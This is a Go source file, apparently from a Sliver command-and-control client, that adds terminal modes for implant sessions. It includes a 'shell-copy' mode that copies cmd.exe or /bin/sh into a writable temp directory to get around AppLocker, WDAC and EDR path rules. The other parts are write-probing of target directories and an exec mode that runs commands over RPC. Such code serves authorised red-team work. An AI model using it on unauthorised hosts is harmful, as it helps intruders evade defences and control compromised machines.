package sliver

import (
	"encoding/base64"
	"fmt"
	"path"
	"strings"

	"github.com/bishopfox/sliver/protobuf/commonpb"
)

// Terminal modes. These are not three ways to do the same thing -- they trade
// interaction quality against the number of assumptions they make about the
// target, and the right one depends on the host.
//
//	shell  a real shell over a tunnel. Best interaction, most assumptions:
//	       needs a usable shell binary and permission to exec it.
//	shell-copy
//	       the same, but the shell is copied to a writable temp directory
//	       first. Costs one upload; survives path-based policy (AppLocker /
//	       WDAC / EDR rules that allow execution from temp but not from
//	       System32) and read-only system volumes.
//	exec   no shell at all: each line is split and run through the Execute RPC.
//	       Loses prompts, pipes, redirection and builtins, and is the only mode
//	       that works on a target with no shell whatsoever -- a distroless or
//	       scratch container still has whatever binary you name.
//
// The last two are implemented entirely in this package. That matters: implant
// changes require rebuilding and redistributing payloads, while these work
// against sessions that are already running.
const (
	TerminalModeShell     = "shell"
	TerminalModeShellCopy = "shell-copy"
	TerminalModeExec      = "exec"
)

// NormalizeTerminalMode maps a requested mode onto one of the three, defaulting
// to a real shell.
//
// An unknown value is treated as the default rather than refused: the mode
// arrives from a query string on a page that may be an old build, and falling
// back to the behaviour that always existed is friendlier than a terminal that
// will not open.
func NormalizeTerminalMode(m string) string {
	switch strings.ToLower(strings.TrimSpace(m)) {
	case TerminalModeShellCopy, "copy", "shell_copy":
		return TerminalModeShellCopy
	case TerminalModeExec, "raw", "noshell":
		return TerminalModeExec
	default:
		return TerminalModeShell
	}
}

// TempShellResult describes where a copied shell ended up.
type TempShellResult struct {
	// Path is the location on the target.
	Path string
	// Source is the shell that was copied, for the message shown to the operator.
	Source string
	// Bytes is the size, so the terminal can say what it did.
	Bytes int
}

// StageShellForSession copies a shell binary into the session's writable temp
// directory and returns the new path.
//
// The point is path-based policy. A host can permit execution from %TEMP% and
// deny it from C:\Windows\System32, and that is not a hypothetical: it is what
// several application-control configurations look like, and it is also what a
// read-only system volume forces. Nothing here escalates anything -- it moves a
// binary the session is already entitled to run to a location it is allowed to
// run from.
//
// The candidate list is ordered by how likely each is to work. On Windows,
// cmd.exe is first because PowerShell is the shell that most often fails to
// start on an older or more locked-down host. On unix, /bin/sh is the one that
// is almost always present.
func (c *Client) StageShellForSession(sessionID, shellPath string) (*TempShellResult, error) {
	info, err := c.sessionInfo(sessionID)
	if err != nil {
		return nil, err
	}

	candidates := shellCandidatesFor(info.OS, shellPath)
	if len(candidates) == 0 {
		return nil, fmt.Errorf("no shell to copy for %s", info.OS)
	}

	tempDir, err := c.writableTempDir(sessionID, info.OS)
	if err != nil {
		return nil, err
	}

	var tried []string
	for _, src := range candidates {
		encoded, _, err := c.Download(sessionID, src)
		if err != nil {
			tried = append(tried, fmt.Sprintf("%s (%v)", src, err))
			continue
		}
		data, err := base64.StdEncoding.DecodeString(encoded)
		if err != nil {
			tried = append(tried, fmt.Sprintf("%s (undecodable download)", src))
			continue
		}
		if len(data) == 0 {
			tried = append(tried, fmt.Sprintf("%s (empty)", src))
			continue
		}

		dst := joinRemote(tempDir, remoteBase(src))
		if err := c.Upload(sessionID, dst, data); err != nil {
			tried = append(tried, fmt.Sprintf("%s -> %s (%v)", src, dst, err))
			continue
		}
		// Unix needs the bit set explicitly; an upload does not carry the mode
		// from the source, and a shell without +x fails with a permission error
		// that reads like a policy denial.
		if info.OS != "windows" {
			if err := c.Chmod(sessionID, dst, "0755", false); err != nil {
				tried = append(tried, fmt.Sprintf("%s -> %s (chmod: %v)", src, dst, err))
				continue
			}
		}
		return &TempShellResult{Path: dst, Source: src, Bytes: len(data)}, nil
	}

	return nil, fmt.Errorf("could not stage a shell in %s: %s", tempDir, strings.Join(tried, "; "))
}

// shellCandidatesFor lists the shells worth trying, most likely first.
//
// An explicit shellPath wins outright: if the operator asked for a specific
// program, copying something else instead would answer a question they did not
// ask.
func shellCandidatesFor(goos, shellPath string) []string {
	if shellPath != "" {
		return []string{shellPath}
	}
	if goos == "windows" {
		return []string{
			`C:\Windows\System32\cmd.exe`,
			`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
			`C:\Windows\SysWOW64\cmd.exe`,
		}
	}
	return []string{"/bin/sh", "/usr/bin/sh", "/bin/bash", "/usr/bin/bash", "/busybox"}
}

// writableTempDir finds somewhere on the target to write, preferring the
// platform's own temp location and falling back to the working directory.
//
// It verifies by writing, not by asking: an existence check on a temp directory
// says nothing about whether the session's token can write to it, and on a
// hardened host a directory that exists and is unwritable is the common case.
func (c *Client) writableTempDir(sessionID, goos string) (string, error) {
	var candidates []string
	if goos == "windows" {
		env, err := c.GetEnv(sessionID)
		if err == nil {
			for _, e := range env {
				if strings.EqualFold(e.Key, "TEMP") || strings.EqualFold(e.Key, "TMP") {
					if e.Value != "" {
						candidates = append(candidates, e.Value)
					}
				}
			}
		}
		candidates = append(candidates, `C:\Windows\Temp`, `C:\ProgramData`)
	} else {
		candidates = append(candidates, "/tmp", "/var/tmp", "/dev/shm")
		if pwd, err := c.Pwd(sessionID); err == nil && pwd != "" {
			candidates = append(candidates, pwd)
		}
		candidates = append(candidates, ".")
	}

	var tried []string
	for _, dir := range candidates {
		if dir == "" {
			continue
		}
		probe := joinRemote(dir, ".c2tool-write-probe")
		if err := c.Upload(sessionID, probe, []byte("probe")); err != nil {
			tried = append(tried, fmt.Sprintf("%s (%v)", dir, err))
			continue
		}
		// Leave nothing behind on a host we only probed.
		_ = c.Rm(sessionID, probe, false)
		return dir, nil
	}
	return "", fmt.Errorf("no writable directory among %s", strings.Join(tried, "; "))
}

// joinRemote joins path elements using the separator the target will expect.
//
// filepath.Join on the console would use the *operator's* separator, which
// produces "C:\Windows\Temp/cmd.exe" when the console runs on Windows and the
// target is Linux, and vice versa. The target is what matters.
func joinRemote(dir, name string) string {
	if strings.Contains(dir, `\`) || (len(dir) > 1 && dir[1] == ':') {
		return strings.TrimRight(dir, `\/`) + `\` + name
	}
	return path.Join(dir, name)
}

// remoteBase returns the last element of a path as the TARGET would read it.
//
// This is filepath.Base's twin, and it exists for the same reason joinRemote
// exists: filepath.Base applies the *console's* separator rules. On a Linux
// console it sees no separator at all in `C:\Windows\System32\cmd.exe`,
// because backslash is an ordinary filename character there, and returns the
// whole string. The upload target then became:
//
//	C:\Users\Rycar\AppData\Local\Temp\C:\Windows\System32\cmd.exe
//
// which the implant refuses with "The filename, directory name, or volume label
// syntax is incorrect" -- the shell-copy mode failed for every candidate, on
// every Windows target, whenever the console ran on Linux or macOS.
//
// Both separators are honoured rather than just the target's: the path comes
// from the candidate list, so a console on Windows copying to a unix target
// must still split on "/". Taking the last element after either separator is
// correct in both directions, and a name containing neither is returned as is.
func remoteBase(p string) string {
	if i := strings.LastIndexAny(p, `\/`); i >= 0 {
		return p[i+1:]
	}
	return p
}

// sessionInfo is the small slice of session metadata this file needs.
type sessionInfo struct {
	ID   string
	OS   string
	Arch string
}

// sessionInfo looks a session up by ID.
func (c *Client) sessionInfo(sessionID string) (*sessionInfo, error) {
	ctx, cancel := rpcCtx(rpcQuick)
	defer cancel()
	sessions, err := c.RPC.GetSessions(ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	for _, s := range sessions.GetSessions() {
		if s.GetID() == sessionID {
			return &sessionInfo{ID: s.GetID(), OS: strings.ToLower(s.GetOS()), Arch: s.GetArch()}, nil
		}
	}
	return nil, fmt.Errorf("no session with id %s", sessionID)
}

// ExecLineResult is the outcome of one line in exec mode.
type ExecLineResult struct {
	Stdout   string
	Stderr   string
	Status   uint32
	ExitCode uint32
	// Handled means the line was a client-side builtin and never reached the
	// target, so the caller should not treat empty output as a failed command.
	Handled bool
	// Err is set for a refusal -- an unsupported construct or a spawn failure --
	// as opposed to a command that ran and returned non-zero.
	Err error
}

// RunExecLine runs one line of input in exec mode.
//
// The parsing is intentionally minimal: split on whitespace, honouring quotes,
// then treat the first word as a program and the rest as arguments. It is not a
// shell and does not pretend to be one -- a line that uses shell syntax is
// refused with a message saying so, because passing "|" through as an ordinary
// argument produces a confusing result that looks like the target misbehaving.
func (c *Client) RunExecLine(sessionID, line string, cwd *string) ExecLineResult {
	line = strings.TrimSpace(line)
	if line == "" {
		return ExecLineResult{Handled: true}
	}

	argv, err := SplitCommandLine(line)
	if err != nil {
		return ExecLineResult{Err: err}
	}
	if len(argv) == 0 {
		return ExecLineResult{Handled: true}
	}

	// Unsupported shell syntax. Named explicitly rather than folded into the
	// general "unknown program" path so the operator learns what this mode
	// cannot do instead of watching a program receive odd arguments.
	if bad := unsupportedShellSyntax(line); bad != "" {
		return ExecLineResult{Err: fmt.Errorf(
			"exec mode has no shell, so %s is not available. Use the shell or shell-copy mode for "+
				"this command, or run the program directly with arguments", bad)}
	}

	switch strings.ToLower(argv[0]) {
	case "exit", "quit":
		return ExecLineResult{Handled: true, Err: errExecExit}
	case "pwd":
		p, err := c.Pwd(sessionID)
		if err != nil {
			return ExecLineResult{Err: err}
		}
		return ExecLineResult{Stdout: p + "\n", Handled: true}
	case "cd":
		if len(argv) == 1 {
			p, err := c.Pwd(sessionID)
			if err != nil {
				return ExecLineResult{Err: err}
			}
			return ExecLineResult{Stdout: p + "\n", Handled: true}
		}
		target := argv[1]
		if cwd != nil && !isRootedPath(target) {
			target = joinRemote(*cwd, target)
		}
		out, err := c.Cd(sessionID, target)
		if err != nil {
			return ExecLineResult{Err: err}
		}
		return ExecLineResult{Stdout: out + "\n", Handled: true}
	}

	res, err := c.Execute(sessionID, argv[0], argv[1:])
	if err != nil {
		return ExecLineResult{Err: err}
	}
	return ExecLineResult{
		Stdout:   res.Stdout,
		Stderr:   res.Stderr,
		Status:   res.Status,
		ExitCode: res.Status,
	}
}

// errExecExit is a sentinel: the caller closes the terminal when it sees it.
var errExecExit = fmt.Errorf("exit requested")

// IsExecExit reports whether a result means the operator asked to leave.
func IsExecExit(r ExecLineResult) bool {
	return r.Err == errExecExit
}

// unsupportedShellSyntax names the first shell construct in a line that exec
// mode cannot honour, or "" when there is none.
func unsupportedShellSyntax(line string) string {
	// Only unquoted occurrences count: "a|b" as an argument is legitimate.
	inSingle, inDouble := false, false
	for i := 0; i < len(line); i++ {
		ch := line[i]
		switch ch {
		case '\'':
			if !inDouble {
				inSingle = !inSingle
			}
		case '"':
			if !inSingle {
				inDouble = !inDouble
			}
		case '|':
			if !inSingle && !inDouble {
				if i+1 < len(line) && line[i+1] == '|' {
					return "'||'"
				}
				return "'|' (pipes)"
			}
		case '>':
			if !inSingle && !inDouble {
				if i+1 < len(line) && line[i+1] == '>' {
					return "'>>' (append redirection)"
				}
				return "'>' (redirection)"
			}
		case '<':
			if !inSingle && !inDouble {
				return "'<' (input redirection)"
			}
		case '&':
			if !inSingle && !inDouble {
				if i+1 < len(line) && line[i+1] == '&' {
					return "'&&' (command chaining)"
				}
				return "'&' (backgrounding)"
			}
		case ';':
			if !inSingle && !inDouble {
				return "';' (command chaining)"
			}
		case '`':
			if !inSingle {
				return "backticks (command substitution)"
			}
		case '$':
			if !inSingle && i+1 < len(line) && line[i+1] == '(' {
				return "'$(...)' (command substitution)"
			}
		case '*', '?':
			if !inSingle && !inDouble {
				return "globbing"
			}
		}
	}
	return ""
}

// SplitCommandLine splits a command line into arguments, honouring single and
// double quotes.
//
// This is the whole of exec mode's parser. It exists so that a path with a space
// can be passed at all; anything richer would be an attempt to reimplement a
// shell, which is exactly what this mode exists to avoid.
//
// Backslash is NOT an escape character here, and that is deliberate.
//
// The first draft treated it as one inside double quotes, following POSIX shell
// convention. On a Windows target that silently mangles every path:
//
//	"C:\Program Files\app.exe"   ->   C:Program Filesapp.exe
//
// because each backslash was consumed as an escape. The bug is invisible until
// the command fails for a reason that mentions a path nobody typed.
//
// The operator this mode exists for is running Windows, and on Windows a
// backslash inside a quoted argument is a path separator that must survive
// verbatim. Since quotes already provide a way to include spaces, dropping
// escape processing costs nothing that matters and removes a whole class of
// silent corruption.
func SplitCommandLine(line string) ([]string, error) {
	var out []string
	var cur strings.Builder
	inSingle, inDouble, started := false, false, false

	flush := func() {
		if started {
			out = append(out, cur.String())
			cur.Reset()
			started = false
		}
	}

	for i := 0; i < len(line); i++ {
		ch := line[i]
		switch {
		case ch == '\'' && !inDouble:
			inSingle = !inSingle
			started = true
		case ch == '"' && !inSingle:
			inDouble = !inDouble
			started = true
		case (ch == ' ' || ch == '\t') && !inSingle && !inDouble:
			flush()
		default:
			cur.WriteByte(ch)
			started = true
		}
	}
	if inSingle || inDouble {
		return nil, fmt.Errorf("unbalanced quote in %q", line)
	}
	flush()
	return out, nil
}

// isRootedPath reports whether p is absolute on either platform.
func isRootedPath(p string) bool {
	if strings.HasPrefix(p, "/") {
		return true
	}
	if len(p) >= 3 && p[1] == ':' && (p[2] == '\\' || p[2] == '/') {
		return true
	}
	return strings.HasPrefix(p, `\\`)
}
